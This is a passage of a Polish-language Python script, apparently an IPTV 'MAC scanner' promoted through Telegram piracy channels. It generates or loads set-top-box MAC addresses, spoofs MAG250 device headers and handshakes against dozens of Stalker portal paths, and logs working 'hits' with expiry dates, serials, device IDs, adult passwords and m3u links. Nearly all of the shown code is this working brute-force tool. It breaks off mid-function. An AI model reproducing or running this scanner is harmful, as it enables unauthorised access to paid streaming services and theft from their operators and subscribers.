             "90:0E:B3", "00:1A:79", "18:C8:E7", "E0:37:17", "AA:88:99", "AC:00:1A", "FF:1A:79", "DC:9A:2F", "D0:D0:03",
             "32:2D:D1", "11:22:00", "00:1A:79, A0:BB:3E, 00:1B:79", "00:1A:79, A0:BB:3E", "XX:XX:XX", "WIELE")

print(f"""{BLUE} 

    1. Wpisz Portal
    2. Wybierz Plik z Portalem
    3. Zapisz Portale z urlscan.io
    4. Pobierz Portale z urlscan.io


{GREEN} ≼ ⟬ {GRAY} Przykład = {GOLD}4{GREEN} ⟭ ≽  {BLUE} 
""")

portal_input = int(input("Wybierz: ") or 4)
print(f"""

{GREEN} ≼ ⟬ {GRAY} twój wybór = {GOLD}{portal_input}{GREEN} ⟭ ≽  {BLUE}

""")

if portal_input == 3: fetch_and_save_urlscan_io(); portal_input = 2
if portal_input == 1:
    paneltotLen = print(f"""

{GREEN} ≼ ⟬ {GRAY} Możesz wpisać Multi Portal, zakończ 
{GREEN} ≼ ⟬ {GRAY} pustą linią {GOLD}(2x Enter){GRAY}:
""")

    url_regex = re.compile(r'https?://[^\s/]+(?:/c/?|)')
    text_lines = []
    
    while True:
        line = input().strip()
        if not line: break
        text_lines.append(line)
    
    paneltotLen = [line.strip() for line in text_lines if url_regex.match(line)]
    testo0, testo1 = search_panel("http://"+ extract_host_port(paneltotLen[0]))
    
    if paneltotLen:
        paneluz = len(paneltotLen)
        erste_zeile = paneltotLen[0]
    else:
        paneltotLen = fetch_and_choose_url()
        paneluz=(len(paneltotLen))
        erste_zeile="LX-Scan"
    
if portal_input == 4:
    paneltotLen = fetch_and_choose_url()
    if paneltotLen:
        paneluz=len(paneltotLen)
        erste_zeile="LX-Scan"
    else: portal_input = 2

if portal_input == 1:
    print(f"\n\n{GREEN} ≼ ⟬ {GRAY} Panel Checker: {GOLD}http://{extract_host_port(paneltotLen[0])}{GREEN} ⟭ ≽  {BLUE}\n")
    for entry in testo0:
        if '{RESET}' in entry:
            color_part, rest = entry.split('{RESET}', 1)
            color_part += '{RESET}'
            print(f"{color_part} {rest.strip()}")
        else: print(entry.strip())
    input(f"\n{GREEN} ≼ ⟬ {GRAY} Dalej kliknij {GOLD}Enter{GREEN} ⟭ ≽  {BLUE}")

if portal_input == 2:
    files = list_files(combo_dir)
    if files:
        selected_file = get_user_choice(files)
        pdosya = os.path.join(combo_dir, selected_file)
        erste_zeile = read_first_line(pdosya)
        print(f"\n{GREEN} ≼ ⟬ {GRAY} Twój wybór = {GOLD}{pdosya}{GREEN} ⟭ ≽ {BLUE}\n")
    else: clear_screen(); print("{RED} Zły wybór pliku, Koniec. {RESET}"); quit()
    panelc=open(pdosya, 'r', encoding="utf-8")
    paneltotLen=panelc.readlines()
    paneluz=(len(paneltotLen))

paneltotLen = paneltotList(paneltotLen)
intro=f"""
     {GOLD}1{GRAY} = {GREEN}portal.php
     {GOLD}2{GRAY} = {GREEN}server/load.php
     {GOLD}3{GRAY} = {GREEN}stalker_portal
     {GOLD}4{GRAY} = {GREEN}portalstb/portal.php
     {GOLD}5{GRAY} = {GREEN}k/portal.php(comet)
     {GOLD}6{GRAY} = {GREEN}maglove/portal.php
     {GOLD}7{GRAY} = {GREEN}XUI NXT /c/server/load.php
     {GOLD}8{GRAY} = {GREEN}XUI NXT /c/portal.php
     {GOLD}9{GRAY} = {GREEN}magportal/portal.php
     {GOLD}10{GRAY} = {GREEN}powerfull/portal.php
     {GOLD}11{GRAY} = {GREEN}magaccess/portal.php
     {GOLD}12{GRAY} = {GREEN}ministra/portal.php
     {GOLD}13{GRAY} = {GREEN}link ok/portal.php
     {GOLD}14{GRAY} = {GREEN}delko/portal.php
     {GOLD}15{GRAY} = {GREEN}delko/server/load.php
     {GOLD}16{GRAY} = {GREEN}bStream/server/load.php
     {GOLD}17{GRAY} = {GREEN}bStream/bs.mag.portal.php
     {GOLD}18{GRAY} = {GREEN}blowportal.php
     {GOLD}19{GRAY} = {GREEN}p/portal.php
     {GOLD}20{GRAY} = {GREEN}client/portal.php
     {GOLD}21{GRAY} = {GREEN}portalmega/portal.php
     {GOLD}22{GRAY} = {GREEN}portalmega/portalmega.php
     {GOLD}23{GRAY} = {GREEN}magload/magload.php
     {GOLD}24{GRAY} = {GREEN}portal/c/portal.php
     {GOLD}25{GRAY} = {GREEN}white/useragent/portal.php
     {GOLD}26{GRAY} = {GREEN}white/config/portal.php
     {GOLD}27{GRAY} = {GREEN}ultra/white/portal.php
     {GOLD}28{GRAY} = {GREEN}realblue/server/load.php
     {GOLD}29{GRAY} = {GREEN}realblue/portal.php
"""
intro=intro+f"""{BLUE}
Wybierz panel. 

{GOLD}Domyślny panel: portal.php

{GREEN} ≼ ⟬ {GRAY}Zalecana opcja numer = {GOLD}1{GREEN} ⟭ ≽  {BLUE} 

Wpisz numer panelu = {RESET}"""
panel = input(intro) or "1"
typ_potalu="portal.php"
useragent_ok="okhttp/4.7.1"
useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
panel_mapping = {
    "": ("portal.php", useragent),
    "1": ("portal.php", useragent),
    "2": ("server/load.php", useragent),
    "3": ("stalker_portal/server/load.php", useragent),
    "4": ("portalstb/portal.php", useragent),
    "5": ("k/portal.php", useragent),
    "6": ("maglove/portal.php", useragent),
    "7": ("c/server/load.php", useragent),
    "8": ("c/portal.php", useragent),
    "9": ("magportal/portal.php", useragent),
    "10": ("powerfull/portal.php", useragent),
    "11": ("magaccess/portal.php", useragent),
    "12": ("ministra/portal.php", useragent),
    "13": ("Link_OK", useragent),
    "14": ("delko/portal.php", useragent),
    "15": ("delko/server/load.php", useragent),
    "16": ("bStream/server/load.php", useragent),
    "17": ("bStream/bs.mag.portal.php", useragent),
    "18": ("blowportal/portal.php", useragent),
    "19": ("p/portal.php", useragent),
    "20": ("client/portal.php", useragent),
    "21": ("portalmega/portal.php", useragent),
    "22": ("portalmega/portalmega.php", useragent),
    "23": ("magload/magload.php", useragent),
    "24": ("portal/c/portal.php", useragent),
    "25": ("portal.php", useragent),
    "26": ("portal.php", useragent, "portal"),
    "27": ("portal.php", useragent, "ultra"),
    "28": ("server/load.php", useragent_ok, "realblue")
}
typ_potalu, useragent, *extra = panel_mapping.get(panel, ("portal.php", useragent))
realblue = "real" if panel == "29" else ""
if extra: uzmanc = extra[0]

combomacyesno=input(f'''\n{GREEN}	⟬ {GRAY}Combo MAC{GREEN} ⟭   {BLUE}

{GOLD}    0 {GRAY}= {GREEN}Combo MAC prefixy
{GOLD}    1 {GRAY}= {GREEN}Combo MAC z pliku

{GREEN} ≼ ⟬ {GRAY}Przykład = {GOLD}0{GREEN} ⟭ ≽  {BLUE} 

wybór = {RESET}''') or '0'

if combomacyesno=="0":
    print(f"\n{GREEN}	⟬ {GRAY}Combo MAC prefixy{GREEN} ⟭   {BLUE} \n")
    nnesil = list(yeninesil)
    for xd in range(len(nnesil)):
        tire = "   》" if xd < 8 and len(nnesil[xd]) < 9 else "   》"
        print(f"	{GOLD}{xd+1}{GRAY}{tire}{GREEN}{nnesil[xd]}")
    mactur=input(f"""{BLUE}
Wskaż wybrany typ MAC
 
{GREEN} ≼ ⟬ {GRAY}Przykład = {GOLD}20{GREEN} ⟭ ≽  {BLUE} 
 
Typ numer = {RESET}""")
    if mactur=="":mactur=20
    mactur=yeninesil[int(mactur)-1]
    
    if mactur.upper() == "WIELE":
        print(f"\n{GREEN}⟬ {GRAY}Dostępne prefixy MAC{GREEN} ⟭{BLUE}\n")
        for i, prefix in enumerate(yeninesil[:29]):
            print(f"   {GOLD}{i+1}{GRAY} = {GREEN}{prefix}")
        selected = input(f"\n{BLUE}Wpisz numery prefixów oddzielone przecinkami (np. 1,5,9) lub wpisz ALL: {RESET}").strip()
        if selected.strip().upper() == "ALL":
            mactur = ", ".join(yeninesil[:29])
        else:
            try:
                indices = [int(i)-1 for i in selected.split(",") if i.strip().isdigit()]
                mactur = ", ".join([yeninesil[i] for i in indices if 0 <= i < 29])
            except:
                print(f"{RED}Błąd w wyborze prefixów. Domyślnie ustawiono 00:1A:79{RESET}")
                mactur = "00:1A:79"

    if mactur=="XX:XX:XX":
        mactur=input(f"""{BLUE}
Wpisz typ MACa

{GREEN} ≼ ⟬ {GRAY}Przykład = {GOLD}00:1A:79, A0:BB:3E, 00:1B:79{GREEN} ⟭ ≽  {BLUE} 

 
{GREEN} ≼ ⟬ {GRAY}Wybór = {GOLD} """) or "00:1A:79, A0:BB:3E, 00:1B:79"
        if mactur=="":mactur=yeninesil[19]
    print(f"""

{GREEN} ≼ ⟬ {GRAY} twój wybór = {GOLD}{mactur}{GREEN} ⟭ ≽  {BLUE}
""")
    macuz=input(f"""{BLUE}

Wybierz ilość adresów MAC do przeskanowania

{GREEN} ≼ ⟬ {GRAY}Przykład = {GOLD}100000{GREEN} ⟭ ≽  {BLUE} 

Ilość = {RESET}""")
    if macuz=="":macuz=100000
    macuz=int(macuz)
    print(f"""

{GREEN} ≼ ⟬ {GRAY} twój wybór = {GOLD}{macuz}{GREEN} ⟭ ≽  {BLUE}
""")
else:
    say=0
    files = list_files(combo_dir)
    print(f"\n\n{GREEN}	⟬ {GRAY}Combo MAC listy{GREEN} ⟭   {BLUE} \n")
    for i, file in enumerate(files): say=say+1; print(f"    {GRAY} ⍟ {GOLD}{str(i + 1)}{GRAY}: {GREEN}{file}{GRAY} ⍟    ")
    file_choice = int(input(f"""

{GREEN} ≼ ⟬ {GRAY}Ilość plików w katalogu COMBO = {GOLD}{str(say)}{GREEN} ⟭ ≽  {BLUE}

     Wybierz numer pliku z listy
     Plik numer = {RESET}""") or say) - 1
    if file_choice > -1: 
        chosen_file = files[file_choice]
        dosyaa = os.path.join(combo_dir, chosen_file)
        macc=open(dosyaa, 'r', encoding="utf-8")
        mactotLen=macc.readlines()
        macuz=(len(mactotLen))
    else: exit(0)
    print(f"""

{GREEN} ≼ ⟬ {GRAY} twój wybór = {GOLD}{dosyaa}{GREEN} ⟭ ≽  {BLUE}
""")
    mac_adressen_liste = lese_datei_in_liste(dosyaa)
    print(f"""

{GREEN} ≼ ⟬ {GRAY} ilość adresów MAC w pliku = {GOLD}{macuz}{GREEN} ⟭ ≽  {BLUE}
""")

jakie_kategorie=input(f"""{BLUE}

Wybór ilości informacji w pliku końcowym

{GREEN} ≼ ⟬ {GRAY}Przykład = {GOLD}1{GREEN} ⟭ ≽  {BLUE} 

{GOLD}    0 {GRAY}= {GREEN}Bez katalogów
{GOLD}    1 {GRAY}= {GREEN}Tylko kanały telewizyjne
{GOLD}    2 {GRAY}= {GREEN}Wszystko (LIVE, VOD I SERIALE)

{BLUE}Wpisz wybrany numer = {RESET}""")
if jakie_kategorie=="": jakie_kategorie="1"
from urllib.parse import urlparse
if erste_zeile[:4] == "http": sanitized_url = re.sub(r'[/.:?;!\&]', '_', urlparse(erste_zeile).hostname)
else: sanitized_url = erste_zeile
dosyaadi=str(input(f"""{BLUE} 

{GREEN} ≼ ⟬ {BLUE}Plik do zapisania hitów{GREEN} ⟭ ≽  {BLUE} 

Wpisz wybraną nazwę pliku koncowego

{GREEN} ≼ ⟬ {GRAY}Przykład = {GOLD}{sanitized_url}{GREEN} ⟭ ≽  {BLUE} 

Nazwa pliku = {RESET}"""))
if dosyaadi=="":dosyaadi=sanitized_url 
Dosyac = os.path.join(india_hits_dir, f"INDIA-HIT_{dosyaadi}@🏴‍☠️Pɪʀᴀᴄɪ🏴‍☠️_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")
Dosyab = os.path.join(full_hits_dir, f"FULL-HIT_{dosyaadi}@🏴‍☠️Pɪʀᴀᴄɪ🏴‍☠️_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")
Dosyabxx = os.path.join(combo_dir, f"COMBO-MAC@🏴‍☠️Pɪʀᴀᴄɪ🏴‍☠️.txt")
Dosyabx = os.path.join(combo_hits_dir, f"COMBO-HIT_{dosyaadi}@🏴‍☠️Pɪʀᴀᴄɪ🏴‍☠️_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")
Dosyabk = os.path.join(mini_hits_dir, f"MINI-HIT_{dosyaadi}@🏴‍☠️Pɪʀᴀᴄɪ🏴‍☠️_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")
print(f"""

{GREEN} ≼ ⟬ {GRAY} twój wybór = {GOLD}{Dosyab}{GREEN} ⟭ ≽  {BLUE}
""")

def IndiaHit(hits): file = open(Dosyac, "a", encoding="utf-8"); file.write(hits); file.close()
def FullHit(hits): file = open(Dosyab, "a", encoding="utf-8"); file.write(hits); file.close()
def ComboHit(hits): file = open(Dosyabx, "a", encoding="utf-8"); file.write(hits); file.close()
def ComboMac(hits): file = open(Dosyabxx, "a", encoding="utf-8"); file.write(hits + "\n"); file.close()
def MiniHit(hits): file = open(Dosyabk, "a", encoding="utf-8"); file.write(hits); file.close()

def zmin_czas(wygasza): return next((int((datetime.datetime.strptime(wygasza.strip(), fmt).timestamp() - time.time()) / 86400) for fmt in ("%B %d, %Y, %I:%M %p","%b %d, %Y, %I:%M %p","%B %d, %Y, %H:%M","%b %d, %Y, %H:%M","%B %d, %Y","%b %d, %Y","%d %B %Y","%d %b %Y")), 0)

macs=""

def randommac():
    global ile_mac, macuz, remaining_percentage, mac_adressen_liste, combomacyesno, prefix_input, mactur
    ile_mac += 1
    remaining_percentage = (ile_mac / macuz) * 100
    if combomacyesno == "0":
        if mactur:
            prefix_list = [p.strip() for p in mactur.split(",") if p.strip()]
        else: prefix_list = []
        if not prefix_list: prefix_list = ["00:1A:79", "A0:BB:3E"]
        prefix = random.choice(prefix_list)
        mac = f"{prefix}:{random.randint(0, 255):02x}:{random.randint(0, 255):02x}:{random.randint(0, 255):02x}"
        mac = mac.replace(":100", ":10")
    else: mac = zufaellige_zeile_entnehmen(mac_adressen_liste)
    return mac.upper()

url1 = lambda panel: "http://" + panel + "/" + typ_potalu + "?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml"
url22 = lambda panel, macs: (
    "http://" + panel + "/" + typ_potalu + "?&action=get_profile&mac=" + macs +
    "&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00"
    "&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22" + macs +
    "%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D"
    "&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B"
    "API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
) if realblue == "real" else "http://" + panel + "/" + typ_potalu + "?type=stb&action=get_profile&JsHttpRequest=1-xml"
url3 = lambda panel: "http://" + panel + "/" + typ_potalu + "?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
url5 = lambda panel: "http://" + panel + "/" + typ_potalu + "?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"
url6 = lambda panel: "http://" + panel + "/" + typ_potalu + "?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
liveurl = lambda panel: "http://" + panel + "/" + typ_potalu + "?action=get_genres&type=itv&JsHttpRequest=1-xml"
vodurl = lambda panel: "http://" + panel + "/" + typ_potalu + "?action=get_categories&type=vod&JsHttpRequest=1-xml"
seriesurl = lambda panel: "http://" + panel + "/" + typ_potalu + "?action=get_categories&type=series&JsHttpRequest=1-xml"
url = lambda cid, panel: "http://" + panel + "/" + typ_potalu + "?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/" + str(cid) + "_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"

def hea1(panel,macs):
	HEADERA={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
}
	return HEADERA

def hea2(macs,token,panel):
	tokens=token
	HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"MODization": "Bearer "+tokens,
	}
	return HEADERd

def hea3(panel):
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea

ile_hitow, ile_indyjskich_hitow=0, 0

def hit(mac,wygasza,panel,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,ilosc_live,ilosc_vod,ilosc_serie,adult):
    global hitr, ile_hitow, lduruno, lduruon, indyjskie_kategorie, ile_indyjskich_hitow
    try:
        full_hit=f"""╭─➤ 🏴‍☠️🔹https://t.me/malayalamIPTV9🔹🏴‍☠️ 
│💀https://t.me/MALAYALAMCOMBOPY
├◉ 🌍 Rᴇᴀʟ ➤ """+str(real)+"""
├◉ 🌐 Pᴏʀᴛᴀʟ ➤ http://"""+str(panel)+"""/c/"""+str(playerapi)+"""
├◉ 🛰️ Tʏᴘ Pᴏʀᴛᴀʟᴜ ➤ """+typ_potalu+"""
├◉ 🔢 Mᴀᴄ ➤ """+str(mac)+"""
├◉ 🗓️ Wʏɢᴀsᴀ ➤ """+str(wygasza)+"""
├◉ 🕓 Dᴀᴛᴀ Sᴋᴀɴᴜ ➤ """+str(time.strftime('%d-%m-%Y'))+"""/"""+str(time.strftime('%H:%M:%S'))+"""
├➤🎯 Aᴜᴛᴏʀ Sᴋᴀɴᴜ ➤ """+str(twoj_nick)+"""
├─➤ 🏴‍☠️🄳🄰🄽🄴🔹🄻🄸🅂🅃🅈🏴‍☠️
├◉ 🚦Wʏᴍᴀɢᴀɴʏ Vᴘɴ ➤ """+str(durum)+"""
├◉ 🌐 Vᴘɴ ➤ """+str(country)+"""
╰─➤ Iᴘᴛᴠ Zᴀᴘᴇᴡɴɪʟɪ  🏴‍☠️💀https://t.me/malayalamIPTV9💀🏴‍☠️

╭─➤ 🏴‍☠️🄱🄾🅇🔹🄸🄽🄵🄾🏴‍☠️
├◉ Aᴅᴜʟᴛ Pᴀssᴡᴏʀᴅ ➤ """+str(adult)+"""
├◉ 🔐 Sᴇʀɪᴀʟ ➤ """+str(SNENC)+""" 
├◉ 🔐 Sᴇʀɪᴀʟ Cᴜᴛ ➤ """+str(SNCUT)+"""
├◉ 🖥️1️⃣ Dᴇᴠɪᴄᴇ ID1 ➤ """+str(DEVENC)+"""
├◉ 🖥️2️⃣ Dᴇᴠɪᴄᴇ ID2 ➤ """+str(SINGENC)+"""
╰─➤ ☠️https://t.me/malayalamIPTV9☠️

╭─➤ 📂 Lɪɴᴋ ᴍ3ᴜ➤ """+str(m3ulink)+"""  
╰─➤ Iᴘᴛᴠ Zᴀᴘᴇᴡɴɪʟɪ 🏴‍☠️💀Pɪʀᴀᴄɪ💀🏴‍☠️ 

"""
        if len(ilosc_live) > 1:
            full_hit=full_hit+"""╭─➤ 🏴‍☠️🄻🄸🅂🅃🄰🏴‍☠️
├▣ Tᴠ ➤ """+str(ilosc_live)+"""
├▣ Vᴏᴅ ➤ """+str(ilosc_vod)+"""
├▣ Sᴇʀɪᴀʟᴇ ➤ """+str(ilosc_serie)+f"""
╰─➤ 🏴‍☠️https://t.me/malayalamIPTV9🏴‍☠️  {MOD} 💀

"""
        if  jakie_kategorie=="1" or jakie_kategorie=="2":
            full_hit=full_hit+"""╭─➤ 🏴‍☠️🄻🄸🅂🅃🄰🏴‍☠️
├▣ 🆃︎🆅︎ ➤
╰▣ """+str(livelist)+""" 

"""
        if jakie_kategorie=="2":
            full_hit=full_hit+"""╭▣ 🆅🅾🅳 ➤
╰▣ """+str(vodlist)+"""

╭▣ 🆂🅴🆁🅸︎🅰︎🅻︎🅴︎ ➤
├▣ """+str(serieslist)+"""
╰─➤ ☠️https://t.me/malayalamIPTV9☠️

"""
        mini_hit= f"""
╭─➤ 🏴‍☠️🔹https://t.me/malayalamIPTV9🔹🏴‍☠️ 
│ 💀
├◉ 🕓 Dᴀᴛᴀ Sᴋᴀɴᴜ ➤ """+str(time.strftime('%d-%m-%Y'))+"""/"""+str(time.strftime('%H:%M:%S'))+"""
├◉ 🌍 Rᴇᴀʟ ➤ """+str(real)+"""
├◉ 🌐 Pᴏʀᴛᴀʟ ➤ http://"""+str(panel)+"""/c/"""+str(playerapi)+"""
├◉ 🔢 Mᴀᴄ ➤ """+str(mac)+"""
├◉ 🗓️ Wʏɢᴀsᴀ ➤ """+str(wygasza)+"""                                                                         
├◉ 🚦Wʏᴍᴀɢᴀɴʏ Vᴘɴ ➤ """+str(durum)+"""
├◉ 🌐 Vᴘɴ ➤ """+str(country)+"""
╰─➤ ☠️ ᗰIᑎI https://t.me/malayalamIPTV9☠️
"""
        if not str(livelist) == "" or not str(livelist) == " ":
            FullHit(full_hit)
            MiniHit(mini_hit)
            ile_hitow=ile_hitow+1
            set_title_name(f"({ile_hitow}) | Piraci Premium Scaner")
            print(full_hit)
            if ile_hitow >= ile_mac_combo:hitr=FYELLOW
            if any(symbol in durum for symbol in ("🔒", "❌")): lduruon += 1
            else: 
                lduruno += 1
                if any(symbol in livelist for symbol in ("🇮🇳", "🇮🇳")):
                    indyjskie_kategorie = wydaj_tylko_indyjskie(livelist)
                    india_hit= f"""
╭─➤ 🏴‍☠️🔹SɪʀQᴀᴢ🔺Cᴏɴғɪɢ🔹🏴‍☠️ 
│💀https://t.me/malayalamIPTV9💀
├◉ 🕓 Dᴀᴛᴀ Sᴋᴀɴᴜ ➤ """+str(time.strftime('%d-%m-%Y'))+"""/"""+str(time.strftime('%H:%M:%S'))+"""
├◉ 🌍 Rᴇᴀʟ ➤ """+str(real)+"""
├◉ 🌐 Pᴏʀᴛᴀʟ ➤ http://"""+str(panel)+"""/c/"""+str(playerapi)+"""
├◉ 🔢 Mᴀᴄ ➤ """+str(mac)+"""
├◉ 🗓️ Wʏɢᴀsᴀ ➤ """+str(wygasza)+"""                                                                         
├◉ 🚦Wʏᴍᴀɢᴀɴʏ Vᴘɴ ➤ """+str(durum)+"""
├◉ 🌐 Vᴘɴ ➤ """+str(country)+"""
├◉ 📺 Iɴᴅɪᴀ Kᴀᴛᴇɢᴏʀɪᴇ ➤ |"""+str(indyjskie_kategorie)+"""
╰─➤ ☠️ ᗰIᑎI https://t.me/malayalamIPTV9 ☠️
"""
                    IndiaHit(india_hit)
                    ile_indyjskich_hitow += 1
    except:set_title_name(f"X nie zapisal hita X | ({ile_hitow}) | Piraci Premium Scaner")

def wydaj_tylko_indyjskie(kategorie):
    in_patterns = ["INDIA", "PUNJABI", "MALAYALAM", "MARATHI", "KANNADA", "TAMIL", "GUJARATI", "TELUGU", "BHOJPURI", "URDU", "BENGALI", "SINHALA", "🇮🇳"]
    entries = kategorie.split(" |")
    in_entries = [entry for entry in entries if any(pattern in entry for pattern in in_patterns)]
    if in_entries: return " |".join(in_entries)

cpm, cpmx, hitr = 0, 0, FYELLOW

def get_run_time() -> None:
    global run_time
    current_time2 = time.time() - start_time
    hours = int(current_time2 // 3600)
    minutes = int((current_time2 % 3600) // 60)
    seconds = int(current_time2 % 60)
    run_time = f"{hours}ʜ {minutes}ᴍ {seconds}s"

start_time = time.time()

colors2 = [52, 88, 124, 160, 196, 160, 124, 88, 52]
current_pos, direction = 0, 1
DARKRED = "\x1b[38;5;52m"

def knight_rider(text: str) -> str:
    global current_pos, direction
    colored_text = ""
    for i, char in enumerate(text):
        distance = abs(i - current_pos)
        if distance < len(colors2):
            color = colors2[distance]
            colored_text += f'\x1b[38;5;{color}m{char}'
        else: colored_text += char
    colored_text += f'{RESET}'
    if current_pos == len(text) - 1: direction = -1
    elif current_pos == 0: direction = 1
    current_pos += direction
    return colored_text

def echok(mac,bot,total,ile_mac_combo,oran,tokenr,panel):
	global cpm, status_code, hitr, lduruno, lduruon, runtime, ile_mac, formatted_percentage, ile_indyjskich_hitow
	try:
		san_current_time_date = f'{time.strftime("%m.%d.%Y")} • {time.strftime("%H:%M")}'
		formatted_percentage = "{:.2f}%".format(remaining_percentage)
		cpmx=(time.time()-cpm)
		cpmx=(round(60/cpmx))
		if str(cpmx)=="0":cpm=cpm
		else:cpm=cpmx
		sys.stdout.write('\033[2J\033[H')
		echo=(f"""{GOLD}
{LOGO}
{RESET} 
╭──────► {GOLD}🏴‍☠️ ☠️ ᑭIᖇᗩᑕI ☠️ 🏴‍☠️   {RESET} 
│
│{GRAY} {'ᴘᴀɴᴇʟ►':<8} {INVERT}{str(panel)[:20]}{RESET} 
│{GRAY} {'ᴍᴀᴄ►':<8} """+tokenr+str(mac)+f"""  {RESET}
│
│{GRAY} {'SᴛᴀᴛᴜS►':<8} """ + status_code + f"""  {RESET} 
│
│{GRAY} {'ᴛᴏᴛᴀʟ►':<8} {CYAN}"""+str(ile_mac)+f""" {GRAY}• """+f"""{FRED}"""+str(formatted_percentage)+f""" {GRAY}•{GOLD} """+str(cpm)+f"""ᴄᴘᴍ  {RESET}
│
│{GRAY} {'ʜɪᴛ►':<8} {GREEN}ᴏɴ {GRAY}("""+FYELLOW+str(ile_hitow)+GRAY+f""") • ("""+str(hitr)+str(ile_mac_combo)+GRAY+f""") {BLUE}ᴄᴏᴍʙᴏ  {RESET}
│{GRAY} {'ᴠᴘɴ►':<8} {GREEN}ʙᴇᴢ {GRAY}("""+GOLD+str(lduruno)+GRAY+f""") • ("""+GOLD+str(lduruon)+GRAY+f""") {RED}ᴠᴘɴ  {RESET}
│
│{GRAY} {'SᴄᴀɴTɪᴍᴇ►':<10} {GOLD}{san_current_time_date}  {RESET}
│{GRAY} {'RᴜɴTɪᴍᴇ►':<10} {GOLD}{run_time}  {RESET}
│
│{GRAY} {'ᴛᴡᴏᴊ ᴠᴘɴ►':<10} {GOLD}{country}  {RESET}
│
│{GRAY} {'Iɴᴅɪᴀ ʜɪᴛ►':<10} {GREEN}ᴏɴ {GRAY}("""+GOLD+str(ile_indyjskich_hitow)+GRAY+f""")  {RESET}
│
╰───► {GOLD}🏴‍☠️ 💀 {DARKRED}{knight_rider(f' https://t.me/malayalamIPTV9 ')} 💀 🏴‍☠️    {RESET} 
""")
		sys.stdout.write(echo)
		sys.stdout.flush()
		cpm=time.time()
	except:pass

def vpnip(ip):
	url9="https://freegeoip.app/json/"+ip
	vpnip=""
	veri=""
	try:
		res = ses.get(url9, timeout=4, verify=False)
		veri=str(res.text)
		if not '404 page' in veri:
			vpnips=veri.split('"country_name":"')[1]
			vpnc=veri.split('"city":"')[1].split('"')[0]
			vpn=vpnips.split('"')[0]+' / ' + vpnc
		else:vpn="❌"
	except:vpn="❌"
	return vpn

lduruno, lduruon, indyjskie_kategorie, tokenr = 0, 0, "", RESET

def goruntu(link,panel):
	try:
		res = ses.get(link,  headers=hea3(panel), timeout=(2,5), allow_redirects=False,stream=True)
		duru="🅣︎🅐︎🅚︎🔒❗ "
		if res.status_code==302:
			 duru="Ⓝ︎Ⓘ︎Ⓔ︎ ✅😎 "
	except:
		duru="🅣︎🅐︎🅚︎🔒❗ "
	return duru

def hitprint(panel,mac,wygasza):
	print('     🎯 ℍ𝕀𝕋 𝔹𝕐 ℙ𝕀ℝ𝔸𝕋       \n  '+str(mac)+'\n  ' + str(wygasza))
	if wygasza: ComboHit("http://"+str(panel)+"/c/"+"\n"+str(mac)+"\n"); ComboMac(mac)
	
def list(listlink,macs,token,livel,panel):
	kategori=""
	veri=""
	bag=0
	while True:
		try:
			res = ses.get(listlink, headers=hea2(macs,token,panel), timeout=15, verify=False)
			veri=str(res.text)
			break
		except:
			bag=bag+1
			time.sleep(1)
			if bag==12:break
	if veri.count('title":"')>1:
		for i in veri.split('title":"'):
			try:
				kanal=""
				kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace("\\/","/")
			except:pass
			kategori=kategori+kanal+livel
	list = replace_symbols(kategori.upper())
	return list
	
def m3uapi(playerlink,macs,token,panel):
	mt=""
	bag=0
	while True:
		try:
			res = ses.get(playerlink, headers=hea2(macs,token,panel), timeout=7, verify=False)
			veri=""
			veri=str(res.text)
			break
		except:
			time.sleep(1)
			bag=bag+1
			if bag==6: break
	try:
		acon=""
		if 'active_cons' in veri:
			acon=veri.split('active_cons":')[1]
			acon=acon.split(',')[0]
			acon=acon.replace('"',"")
			mcon=veri.split('max_connections":')[1]
			mcon=mcon.split(',')[0]
